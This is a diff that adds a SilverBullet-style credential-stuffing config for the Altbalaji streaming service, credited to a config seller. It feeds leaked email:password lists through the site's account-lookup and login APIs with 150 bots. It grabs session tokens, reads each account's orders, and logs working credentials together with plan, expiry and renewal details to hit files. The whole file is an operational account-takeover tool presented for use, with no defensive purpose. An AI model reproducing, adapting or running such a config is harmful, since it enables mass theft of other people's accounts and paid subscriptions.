@@ -1,0 +1,146 @@
+[SETTINGS]
+{
+  "Name": "Altbalaji @ExVotic_Configs",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-08-04T00:40:31.2831859+05:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "ExVotic_Configs",
+  "Version": "1.1.1 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Altbalaji",
+  "IconPath": "Icon\\svbfile.ico",
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#User_Agent FUNCTION GetRandomUA -> VAR "UA" 
+
+#Mail_Validation REQUEST GET "https://api.cloud.altbalaji.com/accounts/lookup?login=<USER>&domain=IN" 
+  
+  HEADER "Origin: https://www.altbalaji.com" 
+  HEADER "Referer: https://www.altbalaji.com/" 
+  HEADER "sec-ch-ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "sec-ch-ua-platform: \"Android\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: <UA>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Account not found" 
+    KEY "<RESPONSECODE>" Contains "404" 
+  KEYCHAIN Success OR 
+    KEY "active\":true" 
+    KEY "<RESPONSECODE>" Contains "200" 
+
+#Account_Validation REQUEST POST "https://payment-ms.cloud.altbalaji.com/v1/accounts/login/email?domain=IN" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "origin: https://www.altbalaji.com" 
+  HEADER "referer: https://www.altbalaji.com/" 
+  HEADER "sec-ch-ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "sec-ch-ua-platform: \"Android\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <UA>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "status\":\"ok" 
+    KEY "session_token" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "404" 
+    KEY "Username and password do not match" 
+
+#Token PARSE "<SOURCE>" JSON "session_token" -> VAR "tk" 
+
+#Orders REQUEST GET "https://payment.cloud.altbalaji.com/accounts/orders" 
+  
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "Host: payment.cloud.altbalaji.com" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "origin: https://www.altbalaji.com" 
+  HEADER "referer: https://www.altbalaji.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <UA>" 
+  HEADER "xssession: <tk>" 
+
+UTILITY File "Combo\\Combos.txt" AppendLines "<USER>:<PASS>" 
+
+#Free KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "orders\":[]" 
+
+#Expiry PARSE "<SOURCE>" LR "\"valid_to\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+#Remaining_Days FUNCTION GetRemainingDay "<Expiry>" -> CAP "Remaining Days" 
+
+#Renewal PARSE "<SOURCE>" LR "\",\"recurring\":" ",\"" CreateEmpty=FALSE -> CAP "Renewal" 
+
+#Plan PARSE "<SOURCE>" LR "titles\":{\"default\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Remaining Days>" GreaterThan "0" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Remaining Days>" LessThanOrEqual "0" 
+
+#Credits FUNCTION Constant "@ExVotic_Configs" -> CAP "Config By" 
+
+UTILITY File "Hits\\Altbalaji_Hits.txt" AppendLines "\\n[+]----------- Altbalaji Account ----------[+]\\n \\nEmail = <USER>\\nPassword = <PASS>\\n \\n[+] Expiry = <Expiry>\\n[+] Days Left = <Remaining Days>\\n[+] Plan = <Plan>\\n[+] Renewal = <Renewal>\\n[+] Config By = @ExVotic | Join @ExVotic_Network\\n\\n[+]-----------------------------------[+]\\n " 
+
